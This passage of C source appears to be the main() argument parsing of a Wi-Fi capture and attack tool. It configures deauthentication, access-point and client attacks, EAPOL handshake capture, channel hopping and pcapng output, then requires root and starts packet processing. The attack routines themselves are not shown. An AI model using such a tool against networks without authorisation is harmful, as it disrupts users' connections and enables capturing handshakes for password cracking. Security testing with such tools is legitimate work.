deauthenticationintervall = DEAUTHENTICATIONINTERVALL;
deauthenticationsmax = DEAUTHENTICATIONS_MAX;
apattacksintervall = APATTACKSINTERVALL;
apattacksmax = APPATTACKS_MAX;
filtermode = 0;
statusout = 0;
stachipset = 0;

poweroffflag = false;
activescanflag = false;
rcascanflag = false;
deauthenticationflag = false;
disassociationflag = false;
attackapflag = false;
attackclientflag = false;

interfacename = NULL;
pcapngoutname = NULL;
ippcapngoutname = NULL;
weppcapngoutname = NULL;
filterlistname = NULL;
rcascanpcapngname = NULL;

static const char *short_options = "i:o:O:W:c:t:T:E:D:A:Ihv";
static const struct option long_options[] =
{
	{"filterlist",			required_argument,	NULL,	HCXD_FILTERLIST},
	{"filtermode",			required_argument,	NULL,	HCXD_FILTERMODE},
	{"disable_active_scan",		no_argument,		NULL,	HCXD_DISABLE_ACTIVE_SCAN},
	{"disable_deauthentications",	no_argument,		NULL,	HCXD_DISABLE_DEAUTHENTICATIONS},
	{"give_up_deauthentications",	required_argument,	NULL,	HCXD_GIVE_UP_DEAUTHENTICATIONS},
	{"disable_disassociations",	no_argument,		NULL,	HCXD_DISABLE_DISASSOCIATIONS},
	{"disable_ap_attacks",		no_argument,		NULL,	HCXD_DISABLE_AP_ATTACKS},
	{"give_up_ap_attacks",		required_argument,	NULL,	HCXD_GIVE_UP_AP_ATTACKS},
	{"disable_client_attacks",	no_argument,		NULL,	HCXD_DISABLE_CLIENT_ATTACKS},
	{"station_vendor",		required_argument,	NULL,	HCXD_STATION_VENDOR},
	{"do_rcascan",			no_argument,		NULL,	HCXD_DO_RCASCAN},
	{"save_rcascan",		required_argument,	NULL,	HCXD_SAVE_RCASCAN},
	{"save_rcascan_raw",		required_argument,	NULL,	HCXD_SAVE_RCASCAN_RAW},
	{"enable_status",		required_argument,	NULL,	HCXD_ENABLE_STATUS},
	{"version",			no_argument,		NULL,	HCXD_VERSION},
	{"help",			no_argument,		NULL,	HCXD_HELP},
	{NULL,				0,			NULL,	0}
};

auswahl = -1;
index = 0;
optind = 1;
optopt = 0;

while((auswahl = getopt_long (argc, argv, short_options, long_options, &index)) != -1)
	{
	switch (auswahl)
		{
		case HCXD_FILTERLIST:
		filterlistname = optarg;
		if(filtermode == 0)
			{
			filtermode = 1;
			}
		break;

		case HCXD_FILTERMODE:
		filtermode = strtol(optarg, NULL, 10);
		if((filtermode < 1) || (filtermode > 2))
			{
			fprintf(stderr, "wrong filtermode\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCXD_DISABLE_ACTIVE_SCAN:
		activescanflag = true;
		break;

		case HCXD_DISABLE_DEAUTHENTICATIONS:
		deauthenticationflag = true;
		break;

		case HCXD_GIVE_UP_DEAUTHENTICATIONS:
		deauthenticationsmax = strtol(optarg, NULL, 10);
		if(deauthenticationsmax < 4)
			{
			fprintf(stderr, "wrong deauthentication give up value\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCXD_DISABLE_DISASSOCIATIONS:
		disassociationflag = true;
		break;

		case HCXD_DISABLE_AP_ATTACKS:
		attackapflag = true;
		break;

		case HCXD_GIVE_UP_AP_ATTACKS:
		apattacksmax = strtol(optarg, NULL, 10);
		if(apattacksmax < 4)
			{
			fprintf(stderr, "wrong ap-attack give up value\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCXD_DISABLE_CLIENT_ATTACKS:
		attackclientflag = true;
		break;

		case HCXD_STATION_VENDOR:
		stachipset = strtol(optarg, NULL, 10);
		if(stachipset >= CS_ENDE)
			{
			fprintf(stderr, "wrong station VENDOR information\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCXD_DO_RCASCAN:
		rcascanflag = true;
		break;

		case HCXD_SAVE_RCASCAN:
		rcascanflag = true;
		rcascanlistname = optarg;
		break;

		case HCXD_SAVE_RCASCAN_RAW:
		rcascanflag = true;
		rcascanpcapngname = optarg;
		break;

		case HCXD_ENABLE_STATUS:
		statusout |= strtol(optarg, NULL, 10);
		break;

		case HCXD_HELP:
		usage(basename(argv[0]));
		break;

		case HCXD_VERSION:
		version(basename(argv[0]));
		break;

		case '?':
		usageerror(basename(argv[0]));
		break;
		}
	}

optind = 1;
optopt = 0;
index = 0;
while((auswahl = getopt_long (argc, argv, short_options, long_options, &index)) != -1)
	{
	switch (auswahl)
		{
		case 'i':
		interfacename = optarg;
		if(interfacename == NULL)
			{
			fprintf(stderr, "no interface specified\n");
			exit(EXIT_FAILURE);
			}
		break;

		case 'o':
		pcapngoutname = optarg;
		break;

		case 'O':
		ippcapngoutname = optarg;
		break;

		case 'W':
		weppcapngoutname = optarg;
		break;

		case 'c':
		if(processuserscanlist(optarg) == false)
			{
			fprintf(stderr, "unknown channel selected\n");
			exit (EXIT_FAILURE);
			}
		break;

		case 't':
		staytime = strtol(optarg, NULL, 10);
		if(staytime <= 1)
			{
			fprintf(stderr, "wrong hoptime\nsetting hoptime to 1\n");
			staytime = TIME_INTERVAL;
			}
		break;

		case 'E':
		eapoltimeout = strtol(optarg, NULL, 10);
		if(eapoltimeout < 10)
			{
			fprintf(stderr, "EAPOL timeout is to low\n");
			exit (EXIT_FAILURE);
			}
		break;

		case 'D':
		deauthenticationintervall = strtol(optarg, NULL, 10);
		if(deauthenticationintervall < 1)
			{
			fprintf(stderr, "wrong deauthentication intervall\n");
			exit (EXIT_FAILURE);
			}
		break;

		case 'A':
		apattacksintervall = strtol(optarg, NULL, 10);
		if(apattacksintervall < 1)
			{
			fprintf(stderr, "wrong access point attack intervall\n");
			exit (EXIT_FAILURE);
			}
		break;

		case 'T':
		maxerrorcount = strtol(optarg, NULL, 10);
		break;

		case 'I':
		showinterfaces = true;
		break;

		case 'h':
		usage(basename(argv[0]));
		break;

		case 'v':
		version(basename(argv[0]));
		break;

		case '?':
		usageerror(basename(argv[0]));
		break;
		}
	}

if(filterlistname == NULL)
	{
	filtermode = 0;
	}

if(showinterfaces == true)
	{
	show_wlaninterfaces();
	checkallunwanted();
	return EXIT_SUCCESS;
	}

if(interfacename == NULL)
	{
	fprintf(stderr, "no interface selected\n");
	exit(EXIT_FAILURE);
	}

if(getuid() != 0)
	{
	fprintf(stderr, "this program requires root privileges\n");
	exit(EXIT_FAILURE);
	}

if(opensocket() == false)
	{
	fprintf(stderr, "failed to init socket\n");
	exit(EXIT_FAILURE);
	}

if(globalinit() == false)
	{
	fprintf(stderr, "failed to init globals\n");
	exit(EXIT_FAILURE);
	}

if(rcascanflag == false)
	{
	processpackets(); 
	}
else
	{
	processrcascan(); 
	}


return EXIT_SUCCESS;
}
/*===========================================================================*/
